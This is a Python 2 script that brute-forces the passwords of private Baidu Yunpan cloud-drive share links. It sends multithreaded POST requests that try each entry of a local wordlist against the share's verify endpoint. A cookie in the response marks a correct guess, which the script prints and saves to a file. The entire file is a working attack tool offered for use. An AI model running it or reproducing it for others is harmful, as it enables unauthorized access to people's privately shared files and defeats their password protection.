#/usr/bin/env python
#conding=utf8

__author__ = 'mtfly'
__doc__ = 'brute baidu yunpan privacy share use multi threads'

import requests
import string
import re
import sys
import threading
from Queue import Queue

class Cframe:
    def __init__(self, url, f, thread_num):
        self.url = url
        self.f = f
        self.thread_num = thread_num

    def scan(self):
        queue = Queue()
        for i in xrange(self.thread_num):
            worker = BdThread(queue, self.url)
            worker.daemon = True
            worker.start()
        for line in self.f.readlines():
            queue.put(line.strip('\n'))

        queue.join()

class BdThread(threading.Thread):
    def __init__(self, queue, url):
        threading.Thread.__init__(self)
        self.queue = queue
        self.url = url
    def run(self):
        url = self.url.replace("link", "verify").replace("init", "verify")
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        while True:
            dic = self.queue.get()
            payload = "pwd=" + dic
            try:
                res = requests.post(url=url, data=payload, headers=headers)
                a = res.headers["set-cookie"]
                if "BDCLND=" in a:
                    fo = open('out.txt','w')
                    mlock = threading.Lock()
                    mlock.acquire()
                    print "[+]OK, password is %s" %dic
                    fo.write(payload)
                    mlock.release()
                    fo.close()
                else:
                    #mlock = threading.Lock()
                    #mlock.acquire()
                    #print '[-]%s' %dic
                    #mlock.release()
                    pass
            except Exception, e:
                #mlock = threading.Lock()
                #mlock.acquire()
                #print "[-]connect error"
                #mlock.release()
                pass
            self.queue.task_done() 

def main():
    if len(sys.argv) < 2:
        print '''usage:
    python multiBruteYP.py url thread_num'''         
        sys.exit()
    elif len(sys.argv) == 2:
        url = sys.argv[1]
        thread_num = 20
    else:
        url = sys.argv[1]
        thread_num = int(sys.argv[2])
    f = open('dic.txt','r')
    cf = Cframe(url, f, thread_num)
    cf.scan()
    f.close()

if __name__ == '__main__':
    main()